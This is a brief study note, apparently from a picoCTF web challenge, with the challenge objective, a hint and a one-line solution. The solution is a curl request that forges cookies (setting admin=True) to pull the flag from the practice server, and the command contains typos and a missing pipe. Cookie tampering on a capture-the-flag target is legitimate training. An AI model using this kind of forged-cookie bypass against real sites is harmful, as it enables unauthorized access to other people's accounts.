# Objetivo
The factory is hiding things from all of its users. Can you login as Joe and find what they've been looking at? `https://jupiter.challenges.picoctf.org/problem/13594/` ([link](https://jupiter.challenges.picoctf.org/problem/13594/)) or http://jupiter.challenges.picoctf.org:13594
# Pistas
1. Hmm it doesn't seem to check anyone's password, except for Joe's?
# Solución
```
curl https://jupiter.challenges.picoctf.org/problem/44573/flag -H "Cookie:username=loko;passwprd=loko;admin=True" grep pico

```
![[Pasted image 20240229125402.png]]
# Notas adicionales
# Referencias